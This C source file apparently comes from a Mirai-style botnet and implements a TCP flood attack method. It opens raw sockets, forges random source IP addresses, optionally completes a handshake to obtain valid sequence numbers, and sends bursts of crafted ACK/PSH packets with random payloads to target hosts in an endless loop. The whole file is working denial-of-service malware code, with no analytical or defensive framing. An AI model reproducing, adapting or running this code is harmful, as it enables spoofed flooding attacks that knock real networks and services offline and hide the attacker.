#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

void attack_method_voult(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd, burst;
    uint16_t dport;
    uint32_t payload_size, seq, ack_seq;
    uint8_t ip_ttl, ip_tos, dont_frag;
    uint16_t ip_ident;
    uint8_t flag_syn, flag_ack, flag_psh, flag_urg, flag_rst, flag_fin;
    int payload_rand;

    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xFFFF);
    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 1);
    flag_syn = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, 0);
    flag_ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, 1);
    flag_psh = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, 1);
    flag_urg = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, 0);
    flag_rst = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, 0);
    flag_fin = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, 0);
    payload_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, 1);

    if (burst < 4) burst = 4;
    if (burst > 256) burst = 256;
    if (payload_size > 1460) payload_size = 1460;
    if (payload_size < 1) payload_size = 1;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd < 0) fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) < 0) { close(fd); return; }
    i = 16 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

    int pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
    char pkt[pkt_size];
    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
    char *payload = pkt + sizeof(struct iphdr) + sizeof(struct tcphdr);
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;

    char chk_buf[sizeof(struct tcphdr) + payload_size];
    int tcp_len = sizeof(struct tcphdr) + payload_size;

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            uint32_t target_addr = targs[i].netmask < 32 ?
                htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;

            if (flag_syn) {
                int cs = socket(AF_INET, SOCK_STREAM, 0);
                if (cs >= 0) {
                    fcntl(cs, F_SETFL, O_NONBLOCK);
                    struct sockaddr_in ta;
                    ta.sin_family = AF_INET;
                    ta.sin_addr.s_addr = target_addr;
                    ta.sin_port = htons(dport);
                    connect(cs, (struct sockaddr *)&ta, sizeof(ta));

                    time_t hs_end = time(NULL) + 10;
                    while (time(NULL) < hs_end) {
                        struct sockaddr_in from;
                        socklen_t fl = sizeof(from);
                        char rbuf[576];
                        fd_set rfds; FD_ZERO(&rfds); FD_SET(fd, &rfds);
                        struct timeval tv = {0, 50000};
                        if (select(fd + 1, &rfds, NULL, NULL, &tv) <= 0) continue;
                        int r = recvfrom(fd, rbuf, sizeof(rbuf), MSG_DONTWAIT, (struct sockaddr *)&from, &fl);
                        if (r < (int)(sizeof(struct iphdr) + sizeof(struct tcphdr))) continue;
                        if (from.sin_addr.s_addr != target_addr) continue;
                        struct iphdr *rip = (struct iphdr *)rbuf;
                        int iphl = rip->ihl * 4;
                        if (rip->protocol != IPPROTO_TCP) continue;
                        struct tcphdr *rtcp = (struct tcphdr *)(rbuf + iphl);
                        if (rtcp->source == htons(dport) && rtcp->syn && rtcp->ack) {
                            seq = ntohl(rtcp->ack_seq);
                            ack_seq = ntohl(rtcp->seq) + 1;
                            break;
                        }
                    }
                    close(cs);
                }
            }

            dst.sin_addr.s_addr = target_addr;

            memset(iph, 0, sizeof(*iph));
            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(pkt_size);
            iph->id = htons(ip_ident == 0xFFFF ? (rand_next() & 0xFFFF) : ip_ident);
            iph->ttl = ip_ttl;
            if (dont_frag) iph->frag_off = htons(1 << 14);
            iph->protocol = IPPROTO_TCP;
            iph->saddr = rand_next();
            iph->daddr = target_addr;

            memset(tcph, 0, sizeof(*tcph));
            tcph->source = htons(rand_next() % 60000 + 1024);
            tcph->dest = htons(dport);
            tcph->doff = 5;
            tcph->window = htons(65535);
            tcph->urg = flag_urg;
            tcph->ack = flag_ack;
            tcph->psh = flag_psh;
            tcph->rst = flag_rst;
            tcph->syn = flag_syn;
            tcph->fin = flag_fin;

            if (flag_syn) {
                tcph->seq = htonl(seq++);
                tcph->ack_seq = htonl(ack_seq);
            } else {
                tcph->seq = htonl(rand_next());
                tcph->ack_seq = htonl(rand_next());
            }

            if (payload_rand)
                rand_str(payload, payload_size);
            else
                memset(payload, 'A', payload_size);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(*iph));

            util_memcpy(chk_buf, tcph, tcp_len);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(tcp_len), tcp_len);

            for (int b = 0; b < burst; b++) {
                tcph->seq = htonl(seq++);
                if (ip_ident == 0xFFFF)
                    iph->id = htons(rand_next() & 0xFFFF);
                iph->saddr = rand_next();
                tcph->source = htons(rand_next() % 60000 + 1024);

                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(*iph));
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(tcp_len), tcp_len);

                sendto(fd, pkt, pkt_size, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
            }
        }
    }
}
